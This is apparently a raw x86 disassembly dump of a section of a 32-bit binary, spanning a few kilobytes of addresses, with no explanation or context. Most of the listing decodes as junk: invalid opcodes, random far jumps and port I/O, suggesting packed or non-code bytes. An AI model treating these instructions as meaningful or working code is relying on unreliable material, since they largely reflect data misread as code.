  40ab9f:	add    DWORD PTR ss:[ebp+0x38],0xffffffde
  40aba4:	or     ah,BYTE PTR [esi-0x27]
  40aba7:	or     eax,0xfbc24cee
  40abac:	pop    edi
  40abad:	adc    eax,0x66f55326
  40abb2:	test   BYTE PTR [esi+0x21],bl
  40abb5:	cmp    al,BYTE PTR [ecx+0x12197a63]
  40abbb:	repz das 
  40abbd:	test   al,0x63
  40abbf:	cmp    al,0xd6
  40abc1:	or     edx,DWORD PTR [ebx+0x69edc42d]
  40abc7:	icebp  
  40abc8:	add    edi,ebx
  40abca:	xchg   ecx,eax
  40abcb:	mov    ebx,0x4fc1f24
  40abd0:	mov    ds:0x38eb09dd,eax
  40abd5:	call   0xbf26:0x3e673f0a
  40abdc:	sub    BYTE PTR [esi],ch
  40abde:	mov    ds:0x7ed495c2,al
  40abe3:	sub    edi,ecx
  40abe5:	xor    al,cl
  40abe7:	cmp    al,0xb3
  40abe9:	daa    
  40abea:	lea    edi,[esi-0x18]
  40abed:	cdq    
  40abee:	enter  0x6e49,0x3e
  40abf2:	es push es
  40abf4:	add    al,0x1b
  40abf6:	out    0xdd,eax
  40abf8:	icebp  
  40abf9:	cld    
  40abfa:	and    eax,0xbd213286
  40abff:	stos   DWORD PTR es:[edi],eax
  40ac00:	bound  esi,QWORD PTR ds:0x2e0151f3
  40ac06:	rol    esi,0xf9
  40ac09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac0a:	sahf   
  40ac0b:	clc    
  40ac0c:	or     eax,DWORD PTR [ebx]
  40ac0e:	sub    edi,DWORD PTR [ebp+0x4b]
  40ac11:	ja     0x40ac11
  40ac13:	push   cs
  40ac14:	mov    WORD PTR [ebp+0x41],?
  40ac17:	cmp    DWORD PTR [esi-0x4969161e],0xffffffb9
  40ac1e:	pop    ecx
  40ac1f:	jmp    0x8fda:0xc468136
  40ac26:	ss add al,0xaa
  40ac29:	adc    eax,0xc695e064
  40ac2e:	imul   esi,DWORD PTR [esi+0x70],0x76b00fcc
  40ac35:	jnp    0x40abdd
  40ac37:	shr    DWORD PTR [ebp+0x3bc06f57],1
  40ac3d:	(bad)  
  40ac3e:	mov    edx,0x5f5cbc02
  40ac43:	add    edi,ecx
  40ac45:	add    edx,ecx
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0xb46a3c5e
  40ac5f:	and    DWORD PTR [edi],ecx
  40ac61:	xchg   esi,eax
  40ac62:	cmp    eax,0xca7c7cfc
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40ac96
  40ac6b:	rol    DWORD PTR [ecx],1
  40ac6d:	mov    al,0xd0
  40ac6f:	dec    ecx
  40ac70:	or     eax,0x490d0c12
  40ac75:	int3   
  40ac76:	mov    eax,ds:0x44976f8
  40ac7b:	dec    edx
  40ac7c:	push   ebx
  40ac7d:	sub    ch,bl
  40ac7f:	inc    esi
  40ac80:	aam    0xa2
  40ac82:	mov    BYTE PTR [eax+0x6c81f68f],dl
  40ac88:	mov    eax,DWORD PTR [ebx+0x62fd1d84]
  40ac8e:	add    eax,DWORD PTR ds:[edi-0x32]
  40ac92:	xchg   BYTE PTR [esi-0x4a],dh
  40ac95:	fistp  WORD PTR ds:0xca332f04
  40ac9b:	sub    bl,bh
  40ac9d:	out    dx,al
  40ac9e:	mov    ebp,0xbe499ed2
  40aca3:	xchg   esp,eax
  40aca4:	sub    BYTE PTR [ecx],bl
  40aca6:	sub    BYTE PTR [ebp+0x7f],0xed
  40acaa:	add    eax,0x13617301
  40acaf:	mov    cl,0x63
  40acb1:	mov    eax,0x2a09809f
  40acb6:	ror    DWORD PTR [ecx+0x29bca341],0x86
  40acbd:	inc    ecx
  40acbe:	outs   dx,DWORD PTR ds:[esi]
  40acbf:	jg     0x40acae
  40acc1:	or     DWORD PTR [esi],ebx
  40acc3:	push   ecx
  40acc4:	repnz or bh,0x1b
  40acc8:	push   esi
  40acc9:	mov    edx,0xe7e9266a
  40acce:	stos   DWORD PTR es:[edi],eax
  40accf:	ins    DWORD PTR es:[edi],dx
  40acd0:	ret    
  40acd1:	enter  0xae8f,0xe9
  40acd5:	loop   0x40ac76
  40acd7:	ins    BYTE PTR es:[edi],dx
  40acd8:	xchg   esi,eax
  40acd9:	pop    ebp
  40acda:	(bad)  
  40acdb:	sub    eax,0xc63cf49b
  40ace0:	xchg   cx,ax
  40ace2:	jmp    0x7085f364
  40ace7:	lahf   
  40ace8:	addr16 je 0x40acd1
  40aceb:	dec    esp
  40acec:	xor    dl,bl
  40acee:	mov    al,0x4
  40acf0:	sbb    dl,BYTE PTR [ecx-0xc]
  40acf3:	add    eax,0x32052eb0
  40acf8:	js     0x40ac85
  40acfa:	clc    
  40acfb:	xor    DWORD PTR [ecx+esi*4-0x17],esi
  40acff:	sub    al,0x4f
  40ad01:	nop
  40ad02:	add    al,0x86
  40ad04:	jmp    0x40aca4
  40ad06:	inc    eax
  40ad07:	(bad)  
  40ad08:	sub    eax,ebp
  40ad0a:	ins    BYTE PTR es:[edi],dx
  40ad0b:	pop    eax
  40ad0c:	push   edi
  40ad0d:	loope  0x40ad54
  40ad0f:	cmp    BYTE PTR [ebp-0x7f2c6552],0xa1
  40ad16:	add    dl,BYTE PTR [ebp-0x573d08a1]
  40ad1c:	(bad)  
  40ad1d:	jae    0x40ad4d
  40ad1f:	sub    edx,DWORD PTR [edx]
  40ad21:	pop    eax
  40ad22:	je     0x40aca4
  40ad24:	mov    ebx,0x51235c67
  40ad29:	outs   dx,DWORD PTR ds:[esi]
  40ad2a:	xor    al,0x6b
  40ad2c:	stc    
  40ad2d:	fwait
  40ad2e:	jg     0x40acbf
  40ad30:	lods   eax,DWORD PTR ds:[esi]
  40ad31:	test   DWORD PTR [ebx-0x6],ecx
  40ad34:	push   es
  40ad35:	retf   
  40ad36:	mov    BYTE PTR [ebp-0x72],0x58
  40ad3a:	pushf  
  40ad3b:	add    al,0xa
  40ad3d:	xor    DWORD PTR [ebp+ebp*4+0x38a5f2ba],esi
  40ad44:	out    dx,eax
  40ad45:	sbb    DWORD PTR [ebp+eax*8-0x40],ebx
  40ad49:	fwait
  40ad4a:	scas   al,BYTE PTR es:[edi]
  40ad4b:	jmp    0x40ad3a
  40ad4d:	in     al,dx
  40ad4e:	mov    ebp,DWORD PTR [ebx-0x72c846e]
  40ad54:	jbe    0x40ad1b
  40ad56:	sbb    al,0x9e
  40ad58:	bnd jns 0x40ad95
  40ad5b:	xor    edi,DWORD PTR [edx-0x4df37f4d]
  40ad61:	push   ds
  40ad62:	jl     0x40acf5
  40ad64:	sbb    dh,BYTE PTR [esi]
  40ad66:	in     eax,0x5b
  40ad68:	mov    ah,0x7d
  40ad6a:	jae    0x40ad4e
  40ad6c:	repnz mov eax,edi
  40ad6f:	aas    
  40ad70:	cli    
  40ad71:	int    0x7c
  40ad73:	and    al,0x9b
  40ad75:	pop    ebx
  40ad76:	inc    edx
  40ad77:	add    al,0x46
  40ad79:	sub    al,0x2a
  40ad7b:	mov    edx,0xc5d15982
  40ad80:	push   edi
  40ad81:	aam    0xbd
  40ad83:	jmp    0xfb4a:0xd96f4ecd
  40ad8a:	pop    ss
  40ad8b:	loop   0x40add0
  40ad8d:	in     al,0x9d
  40ad8f:	(bad)  
  40ad90:	xor    dl,BYTE PTR [eax-0x4612ad8f]
  40ad96:	jmp    0x40ad3a
  40ad98:	addr16 xchg esi,ecx
  40ad9b:	jmp    0xbb0c:0x25f252aa
  40ada2:	div    DWORD PTR [eax]
  40ada4:	lods   eax,DWORD PTR ds:[esi]
  40ada5:	pusha  
  40ada6:	jmp    0xfcc0:0xbc0cdb4a
  40adad:	pushf  
  40adae:	mov    eax,ds:0xfe6036b1
  40adb3:	test   BYTE PTR [ecx-0x66],ch
  40adb6:	pop    edi
  40adb7:	add    al,0x5e
  40adb9:	ret    0x8e66
  40adbc:	fs inc edi
  40adbe:	leave  
  40adbf:	sbb    BYTE PTR [esi],dl
  40adc1:	idiv   DWORD PTR cs:[eax-0x154e0e93]
  40adc8:	mov    gs,WORD PTR [esp+ebx*1-0x23af46e5]
  40adcf:	scas   eax,DWORD PTR es:[edi]
  40add0:	mov    edi,0x56bea252
  40add5:	(bad)  
  40add6:	cs mov dl,0xd6
  40add9:	jle    0x40ae06
  40addb:	pop    edi
  40addc:	ds fwait
  40adde:	out    0x31,eax
  40ade0:	dec    edi
  40ade1:	mov    eax,0x60b9b775
  40ade6:	push   edx
  40ade7:	ret    0x9edf
  40adea:	dec    eax
  40adeb:	mov    ebx,cs
  40aded:	pushf  
  40adee:	sub    al,0xf1
  40adf0:	push   ds
  40adf1:	jp     0x40add6
  40adf3:	xlat   BYTE PTR ds:[ebx]
  40adf4:	jmp    0x40ad87
  40adf6:	adc    eax,0xe9241bd0
  40adfb:	sbb    al,0x4
  40adfd:	sar    DWORD PTR ds:0xfdb070b2,cl
  40ae03:	mov    al,ds:0xe4415ef5
  40ae08:	fisub  DWORD PTR [ebx]
  40ae0a:	mov    edx,0x75f0d8e1
  40ae0f:	test   BYTE PTR [edi+0x457a300d],bl
  40ae15:	je     0x40ae01
  40ae17:	test   al,0xb9
  40ae19:	jbe    0x40ae4c
  40ae1b:	add    ebp,0x6b
  40ae1e:	ds js  0x40ae8e
  40ae21:	cmp    BYTE PTR cs:[esi+0x53fbb32b],0xdf
  40ae29:	xor    cl,BYTE PTR [ebp+0x4a99ec31]
  40ae2f:	mov    edx,0x35fb432b
  40ae34:	(bad)  
  40ae35:	das    
  40ae36:	push   edx
  40ae37:	loopne 0x40ae40
  40ae39:	neg    BYTE PTR [ebp-0x263541e2]
  40ae3f:	and    esi,0x1ef04487
  40ae45:	data16 loopne 0x40ae15
  40ae48:	aaa    
  40ae49:	std    
  40ae4a:	cmp    eax,esi
  40ae4c:	xor    dl,ah
  40ae4e:	adc    eax,0xb93d603f
  40ae53:	outs   dx,BYTE PTR ds:[esi]
  40ae54:	(bad)  
  40ae55:	jbe    0x40ae07
  40ae57:	sbb    BYTE PTR [edi+ebp*1],0x6b
  40ae5b:	jae    0x40aded
  40ae5d:	mov    eax,0x9a637f12
  40ae62:	xchg   edi,eax
  40ae63:	pop    edx
  40ae64:	arpl   WORD PTR ds:0x67a8cbe8,bx
  40ae6a:	push   cs
  40ae6b:	ins    DWORD PTR es:[edi],dx
  40ae6c:	int3   
  40ae6d:	sbb    edi,esp
  40ae6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae70:	lock mov ebp,0x9554e0bc
  40ae76:	jmp    0x40aeae
  40ae78:	mov    al,ds:0xb4e9e78d
  40ae7d:	fld    QWORD PTR [edx+0x262db341]
  40ae83:	add    bl,0xf4
  40ae86:	mov    esp,0x27cab1c1
  40ae8b:	sbb    eax,0xdf6d600d
  40ae90:	fnsave [edx]
  40ae92:	add    bl,BYTE PTR [eax]
  40ae94:	ja     0x40ae6d
  40ae96:	and    BYTE PTR [edx-0x78],bl
  40ae99:	sbb    eax,0x26d493d8
  40ae9e:	mov    DWORD PTR [edx+edx*1-0x59],eax
  40aea2:	dec    edi
  40aea3:	push   ebx
  40aea4:	dec    ebx
  40aea5:	not    DWORD PTR [edx]
  40aea7:	ins    BYTE PTR es:[edi],dx
  40aea8:	loop   0x40aed2
  40aeaa:	jbe    0x40aef5
  40aeac:	xchg   ecx,eax
  40aead:	cmp    eax,0x55cd2b1
  40aeb2:	fstp   DWORD PTR [edi-0x535f74b4]
  40aeb8:	sbb    al,0x10
  40aeba:	pop    edx
  40aebb:	cmp    al,BYTE PTR [ebx+edi*8+0x128cd7da]
  40aec2:	dec    eax
  40aec3:	out    0x5d,al
  40aec5:	les    esp,FWORD PTR [edi+edi*8-0x5666a098]
  40aecc:	(bad)  
  40aecd:	mov    ds:0xfdae7f7a,eax
  40aed2:	jmp    0xa9cbad2
  40aed7:	scas   eax,DWORD PTR es:[edi]
  40aed8:	out    0x25,al
  40aeda:	stos   DWORD PTR es:[edi],eax
  40aedb:	in     al,dx
  40aedc:	cwde   
  40aedd:	dec    edx
  40aede:	lods   al,BYTE PTR ds:[esi]
  40aedf:	inc    eax
  40aee0:	add    eax,0xfe4aaea6
  40aee5:	add    ecx,edi
  40aee7:	mov    ebp,0x41df48f5
  40aeec:	nop
  40aeed:	rcr    cl,cl
  40aeef:	pop    edx
  40aef0:	lock es je 0x40af56
  40aef4:	and    DWORD PTR [ebx-0x71ff461f],ebx
  40aefa:	adc    BYTE PTR [ebp+ebp*4-0x525ae6f9],al
  40af01:	shl    BYTE PTR [esi],1
  40af03:	stc    
  40af04:	sub    DWORD PTR [edx+0xa],ecx
  40af07:	aad    0x44
  40af09:	push   esp
  40af0a:	stc    
  40af0b:	mov    ebp,0x4b5f251e
  40af10:	ins    DWORD PTR es:[edi],dx
  40af11:	(bad)  
  40af12:	mov    al,0x24
  40af14:	sub    ch,BYTE PTR [edx-0x7b59356b]
  40af1a:	xor    cl,ch
  40af1c:	mov    WORD PTR [ebp+0x68],cs
  40af1f:	call   0xd2d90c9d
  40af24:	pushf  
  40af25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af26:	jmp    0x3b31:0xcc14f381
  40af2d:	mov    ebp,0x8da0a4bc
  40af32:	dec    esi
  40af33:	in     al,dx
  40af34:	xor    BYTE PTR [ebx+0x68],cl
  40af37:	sbb    DWORD PTR [esi-0x5b],ecx
  40af3a:	stos   DWORD PTR es:[edi],eax
  40af3b:	jae    0x40af15
  40af3d:	xchg   DWORD PTR [eax-0x45],eax
  40af40:	and    eax,0xab077b8b
  40af45:	mov    esi,0xb0cb0e45
  40af4a:	jo     0x40af06
  40af4c:	sub    ecx,DWORD PTR [esi]
  40af4e:	mov    ecx,0xda4aac8e
  40af53:	popf   
  40af54:	fs daa 
  40af56:	sahf   
  40af57:	das    
  40af58:	ins    BYTE PTR es:[edi],dx
  40af59:	mov    esp,0xbe76c1f0
  40af5e:	dec    edi
  40af5f:	cmp    DWORD PTR [eax+eiz*8-0x162940df],0x4b18a720
  40af6a:	push   0x3068275c
  40af6f:	stos   BYTE PTR es:[edi],al
  40af70:	push   esp
  40af71:	in     al,0x8e
  40af73:	or     edi,DWORD PTR [edx]
  40af75:	clc    
  40af76:	mov    eax,ds:0x87a9b402
  40af7b:	pusha  
  40af7c:	ret    0x11a4
  40af7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af80:	stos   DWORD PTR es:[edi],eax
  40af81:	xor    al,0x66
  40af83:	sub    esi,edx
  40af85:	push   0x339b810f
  40af8a:	xchg   edi,eax
  40af8b:	and    edi,DWORD PTR [edx]
  40af8d:	xchg   edx,eax
  40af8e:	adc    edx,ebp
  40af90:	popf   
  40af91:	cmp    DWORD PTR [eax-0x2bfd24ae],esi
  40af97:	repz mov bl,0xb0
  40af9a:	ja     0x40afa8
  40af9c:	jno    0x40af35
  40af9e:	test   eax,0xb24e9d9d
  40afa3:	shl    DWORD PTR [esi-0x738a51b7],1
  40afa9:	aaa    
  40afaa:	and    al,0xe6
  40afac:	push   ds
  40afad:	nop
  40afae:	pop    ds
  40afaf:	jle    0x40af97
  40afb1:	pop    es
  40afb2:	add    edi,DWORD PTR [edx-0x41e51502]
  40afb8:	sahf   
  40afb9:	mov    bl,0x9b
  40afbb:	xchg   esp,eax
  40afbc:	imul   eax,edx,0x5d8bd7c9
  40afc2:	lock sub ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fsub   DWORD PTR [eax+0x4f]
  40b001:	mov    eax,ds:0x7cf98bdc
  40b006:	jl     0x40afd2
  40b008:	jns    0x40b086
  40b00a:	jl     0x40aff1
  40b00c:	push   ebx
  40b00d:	sbb    al,0x7b
  40b00f:	xchg   ecx,eax
  40b010:	xor    bh,BYTE PTR [eax]
  40b012:	aas    
  40b013:	cmp    BYTE PTR [edi],al
  40b015:	xor    DWORD PTR [edi+ebp*4-0x5],ebx
  40b019:	adc    al,0xac
  40b01b:	jge    0x40b041
  40b01d:	inc    ecx
  40b01e:	push   ebx
  40b01f:	xchg   esi,eax
  40b020:	fst    DWORD PTR [esi-0x232ed71b]
  40b026:	and    BYTE PTR [esi],bl
  40b028:	cmp    eax,DWORD PTR [ebx+0x3d]
  40b02b:	int3   
  40b02c:	idiv   DWORD PTR [ecx]
  40b02e:	push   es
  40b02f:	mov    cl,0xa1
  40b031:	lea    eax,[edx+0x5e]
  40b034:	sbb    DWORD PTR [eax],esi
  40b036:	fidivr WORD PTR [edi]
  40b038:	inc    edx
  40b039:	xor    BYTE PTR [ebp+0x6f],dh
  40b03c:	icebp  
  40b03d:	sar    BYTE PTR [ebx+0x1a],0xf2
  40b041:	lahf   
  40b042:	int3   
  40b043:	imul   edx,DWORD PTR [ebx-0x1d],0x13b1df79
  40b04a:	out    dx,eax
  40b04b:	out    dx,eax
  40b04c:	mov    eax,ds:0x3b9cfbf3
  40b051:	push   DWORD PTR [edi]
  40b053:	push   esp
  40b054:	mov    ecx,0x57812df7
  40b059:	dec    eax
  40b05a:	sti    
  40b05b:	(bad)  
  40b05c:	mov    eax,ds:0x2db32175
  40b061:	sbb    DWORD PTR [ebx+0x139d14e6],edx
  40b067:	std    
  40b068:	sbb    dl,BYTE PTR [ecx+ecx*2+0x258b1019]
  40b06f:	imul   esp,DWORD PTR [esi-0xe],0x1d
  40b073:	cmp    BYTE PTR [ebx-0x125091fe],dl
  40b079:	aam    0xd5
  40b07b:	inc    esi
  40b07c:	nop
  40b07d:	push   0x7
  40b07f:	mov    ch,cl
  40b081:	cs pop edx
  40b083:	std    
  40b084:	jecxz  0x40b06e
  40b086:	mov    edi,0x44cc0eb5
  40b08b:	mov    edi,0xa09262c2
  40b090:	pop    es
  40b091:	icebp  
  40b092:	jg     0x40b106
  40b094:	xchg   ecx,eax
  40b095:	rol    dh,0x37
  40b098:	dec    esp
  40b099:	mov    edx,DWORD PTR [eax]
  40b09b:	mov    DWORD PTR [edx+ebp*1],ebx
  40b09e:	mov    esi,0xc46cbe1b
  40b0a3:	dec    esp
  40b0a4:	scas   al,BYTE PTR es:[edi]
  40b0a5:	add    ah,BYTE PTR [esi]
  40b0a7:	mov    esp,0x2a1efd06
  40b0ac:	jne    0x40b0d0
  40b0ae:	push   ds
  40b0af:	inc    eax
  40b0b0:	rcl    DWORD PTR [ebp-0xc],0x1e
  40b0b4:	cmp    esp,ebx
  40b0b6:	mov    dl,0xb8
  40b0b8:	add    cl,bh
  40b0ba:	mov    al,ds:0xb746be04
  40b0bf:	pop    es
  40b0c0:	jbe    0x40b0df
  40b0c2:	xchg   esi,eax
  40b0c3:	jne    0x40b0fc
  40b0c5:	jnp    0x40b0e9
  40b0c7:	aas    
  40b0c8:	ds pusha 
  40b0ca:	xlat   BYTE PTR ds:[ebx]
  40b0cb:	or     al,0x75
  40b0cd:	add    dl,bl
  40b0cf:	mov    esi,0xbb84e945
  40b0d4:	std    
  40b0d5:	jne    0x40b0ea
  40b0d7:	(bad)  
  40b0d9:	sub    BYTE PTR cs:[ebx],bh
  40b0dc:	cmp    al,0x17
  40b0de:	sub    cl,BYTE PTR [esi-0x184f8a7f]
  40b0e4:	mov    al,ds:0x55449e40
  40b0e9:	test   DWORD PTR [esi+0x62c8ec1e],esp
  40b0ef:	fistp  DWORD PTR fs:[ebx]
  40b0f2:	repz (bad) 
  40b0f4:	push   0xf7ea4786
  40b0f9:	and    DWORD PTR [ecx],eax
  40b0fb:	xor    ah,cl
  40b0fd:	jg     0x40b109
  40b0ff:	data16 fwait
  40b101:	pop    ss
  40b102:	sbb    DWORD PTR [esi+0x10e8c551],ebx
  40b108:	xor    DWORD PTR [edi],edx
  40b10a:	mov    dl,0x5b
  40b10c:	call   0xb5f:0x50eb88e3
  40b113:	popa   
  40b114:	inc    edi
  40b115:	cmp    ebp,DWORD PTR [esi+0x5cc66604]
  40b11b:	(bad)  
  40b11c:	jns    0x40b123
  40b11e:	ret    
  40b11f:	xlat   BYTE PTR ds:[ebx]
  40b120:	call   0x3e92ec5
  40b125:	cmp    esi,DWORD PTR [ebp+eax*1+0x7d]
  40b129:	enter  0x7b17,0x13
  40b12d:	adc    dh,bl
  40b12f:	mov    eax,0x8fe4342a
  40b134:	js     0x40b0fc
  40b136:	ins    DWORD PTR es:[edi],dx
  40b137:	sbb    cl,BYTE PTR [esi+0x4b5571b5]
  40b13d:	push   esp
  40b13e:	pop    esi
  40b13f:	lods   eax,DWORD PTR ds:[esi]
  40b140:	push   edi
  40b141:	inc    edi
  40b142:	mov    esi,0x7ad0938d
  40b147:	adc    ecx,DWORD PTR [esi+0x1dd71327]
  40b14d:	aam    0xf5
  40b14f:	jo     0x40b0e2
  40b151:	addr16 jmp 0x40b156
  40b154:	repz pop ebx
  40b156:	mov    ebx,DWORD PTR [ebx-0xe]
  40b159:	ins    BYTE PTR es:[edi],dx
  40b15a:	popa   
  40b15b:	loopne 0x40b1b9
  40b15d:	pop    ebp
  40b15e:	das    
  40b15f:	rol    BYTE PTR [edx-0x19a6f307],1
  40b165:	xlat   BYTE PTR ds:[ebx]
  40b166:	push   edi
  40b167:	xchg   ecx,eax
  40b168:	and    al,0x3f
  40b16a:	sbb    eax,0xd0dc726e
  40b16f:	je     0x40b1c0
  40b171:	mov    eax,ds:0xb5d3084f
  40b176:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b177:	div    bh
  40b179:	retf   0xe23e
  40b17c:	mov    BYTE PTR [edx+0x76440186],dh
  40b182:	mov    ebp,0x4ce8a82b
  40b187:	add    eax,0x359b3d00
  40b18c:	int3   
  40b18d:	xor    edx,DWORD PTR [ecx]
  40b18f:	mov    cs,esp
  40b191:	pop    ss
  40b192:	adc    esi,ecx
  40b194:	mov    esp,0xe948ab64
  40b199:	int    0x8c
  40b19b:	sbb    edi,DWORD PTR [eax-0x21]
  40b19e:	dec    edx
  40b19f:	jmp    0xee2b2edc
  40b1a4:	adc    al,0xf
  40b1a6:	(bad)  
  40b1a7:	lahf   
  40b1a8:	mov    ds:0xcef16860,eax
  40b1ad:	jne    0x40b16c
  40b1af:	pop    ss
  40b1b0:	test   BYTE PTR [ebx-0x49c8f5ec],dh
  40b1b6:	sub    BYTE PTR [edx],dh
  40b1b8:	or     al,0xb7
  40b1ba:	lods   eax,DWORD PTR ds:[esi]
  40b1bb:	std    
  40b1bc:	sti    
  40b1bd:	dec    edx
  40b1be:	and    al,0x9f
  40b1c0:	out    0xd6,al
  40b1c2:	mov    ?,WORD PTR [ecx+0x5a51c752]
  40b1c8:	imul   eax,DWORD PTR [ebp+ebp*2+0x4c],0x37cd5e17
  40b1d0:	and    BYTE PTR [edx-0x3],ch
  40b1d3:	xor    al,BYTE PTR [edi+0x39298519]
  40b1d9:	mov    dh,0xa7
  40b1db:	test   bh,0xc3
  40b1de:	pushf  
  40b1df:	add    eax,0x8d617823
  40b1e4:	enter  0xf12d,0x5b
  40b1e8:	test   edi,esp
  40b1ea:	add    eax,esi
  40b1ec:	or     edi,DWORD PTR [edi]
  40b1ee:	sti    
  40b1ef:	cdq    
  40b1f0:	or     eax,0x7390be46
  40b1f5:	aas    
  40b1f6:	mov    ds:0xfcd132b2,al
  40b1fb:	daa    
  40b1fc:	into   
  40b1fd:	add    DWORD PTR [esi-0x4f],ecx
  40b200:	sbb    BYTE PTR [esi],dh
  40b202:	sbb    eax,0xefcfe748
  40b207:	adc    eax,0x2a29e38e
  40b20c:	ss push es
  40b20e:	dec    esp
  40b20f:	dec    edi
  40b210:	xchg   ebx,eax
  40b211:	cli    
  40b212:	ja     0x40b219
  40b214:	mov    ebp,0xa27863d6
  40b219:	cmp    al,0x82
  40b21b:	loop   0x40b24c
  40b21d:	mov    DWORD PTR [ebx],esi
  40b21f:	xchg   esi,eax
  40b220:	(bad)  
  40b221:	shr    BYTE PTR [esi-0x7473472a],cl
  40b227:	lds    ebp,FWORD PTR [ebp+0x62]
  40b22a:	cld    
  40b22b:	ss cdq 
  40b22d:	pop    ebp
  40b22e:	(bad)  
  40b22f:	jg     0x40b222
  40b231:	outs   dx,DWORD PTR ds:[esi]
  40b232:	cmp    al,0xc5
  40b234:	data16 xchg BYTE PTR [ebp+0x6efe2986],bh
  40b23b:	fdiv   st(6),st
  40b23d:	nop
  40b23e:	and    ch,BYTE PTR [eax]
  40b240:	aam    0x77
  40b242:	adc    ecx,DWORD PTR [ebx-0x19]
  40b245:	sti    
  40b246:	sbb    ebp,DWORD PTR [edx-0x47b0f650]
  40b24c:	cmp    BYTE PTR [ebx],ah
  40b24e:	in     al,0xfb
  40b250:	pop    es
  40b251:	jne    0x40b2b7
  40b253:	xor    DWORD PTR [eax],edi
  40b255:	jo     0x40b298
  40b257:	pop    edi
  40b258:	imul   esi,edx,0xbd4e0b6b
  40b25e:	xor    ebx,DWORD PTR [ecx]
  40b260:	sub    BYTE PTR [ebp-0x683dbc7a],0xd5
  40b267:	lods   al,BYTE PTR ds:[esi]
  40b268:	jo     0x40b212
  40b26a:	or     al,BYTE PTR [edx]
  40b26c:	int3   
  40b26d:	clc    
  40b26e:	jp     0x40b267
  40b270:	pop    ss
  40b271:	jle    0x40b25d
  40b273:	fidiv  DWORD PTR [esi+edx*4+0x19]
  40b277:	dec    esi
  40b278:	aam    0xae
  40b27a:	cmp    al,0xfe
  40b27c:	loopne 0x40b24a
  40b27e:	jle    0x40b29c
  40b280:	push   edi
  40b281:	jmp    0x59879712
  40b286:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b287:	aas    
  40b288:	mov    edx,DWORD PTR [ecx-0x36]
  40b28b:	and    esi,DWORD PTR [ebx+0x3c]
  40b28e:	repnz mov dl,0xfa
  40b291:	fwait
  40b292:	leave  
  40b293:	cmp    BYTE PTR [esi-0x73],cl
  40b296:	push   ecx
  40b297:	sbb    edi,DWORD PTR [edi]
  40b299:	mov    edi,0xfbbce7b1
  40b29e:	popa   
  40b29f:	xor    BYTE PTR [ebx+0x10],0x79
  40b2a3:	cmp    BYTE PTR [ebx+0x4cc8fbe6],dh
  40b2a9:	mov    ebx,0x4a9b044e
  40b2ae:	pop    ss
  40b2af:	dec    esp
  40b2b0:	mov    ds:0x768a537a,eax
  40b2b5:	call   0x587c:0xccc4baff
  40b2bc:	repnz mov edx,DWORD PTR [ecx]
  40b2bf:	xor    dh,BYTE PTR [ebx]
  40b2c1:	mov    ds,WORD PTR [edx+0xf83aaf2]
  40b2c7:	inc    ecx
  40b2c8:	iret   
  40b2c9:	push   edi
  40b2ca:	mov    edx,0x89b2bd1a
  40b2cf:	add    al,BYTE PTR [ecx+0x166fdc19]
  40b2d5:	adc    eax,0x92279927
  40b2da:	outs   dx,BYTE PTR ds:[esi]
  40b2db:	and    eax,0x11ef988f
  40b2e0:	cmp    al,0x2c
  40b2e2:	inc    ebx
  40b2e3:	sub    bh,BYTE PTR [eax+0x4d2d8762]
  40b2e9:	mov    bl,0xef
  40b2eb:	outs   dx,BYTE PTR ds:[esi]
  40b2ec:	cli    
  40b2ed:	popf   
  40b2ee:	lock cs xchg esp,eax
  40b2f1:	sbb    eax,0x385711b0
  40b2f6:	outs   dx,DWORD PTR ds:[esi]
  40b2f7:	lahf   
  40b2f8:	loope  0x40b35b
  40b2fa:	cmp    DWORD PTR [ebx-0x22],edi
  40b2fd:	and    DWORD PTR [esi-0x30],eax
  40b300:	mov    eax,0xeb6b6430
  40b305:	mov    esi,0x94cbb00d
  40b30a:	mov    ds:0xc2ae67d6,al
  40b30f:	dec    edi
  40b310:	retf   0x59d0
  40b313:	and    DWORD PTR [eax-0x1c],ebp
  40b316:	daa    
  40b317:	sub    eax,0x77c2951f
  40b31c:	mov    eax,0xf90c4b5
  40b321:	shl    DWORD PTR ss:[ebp-0x60],cl
  40b325:	cdq    
  40b326:	stos   DWORD PTR es:[edi],eax
  40b327:	loop   0x40b333
  40b329:	ja     0x40b363
  40b32b:	data16 mov dl,0x75
  40b32e:	xor    BYTE PTR [eax+0x30774f36],ah
  40b334:	jae    0x40b2cd
  40b336:	add    eax,0x6c91ff47
  40b33b:	pop    eax
  40b33c:	into   
  40b33d:	jle    0x40b3a7
  40b33f:	mov    BYTE PTR [ecx-0x64ea3c8],0xdf
  40b346:	xchg   edi,eax
  40b347:	mov    dl,0xfa
  40b349:	xchg   BYTE PTR [ecx+ecx*2+0x605789ab],bl
  40b350:	fbld   TBYTE PTR [edx-0x46]
  40b353:	dec    ebp
  40b354:	(bad)  
  40b355:	jns    0x40b3d0
  40b357:	sbb    al,0x87
  40b359:	pop    ds
  40b35a:	shl    esp,0x69
  40b35d:	mov    cl,0xcc
  40b35f:	ficomp DWORD PTR [ecx+0x3b]
  40b362:	fimul  DWORD PTR [edi]
  40b364:	xchg   DWORD PTR [eax],ecx
  40b366:	add    BYTE PTR [eax],al
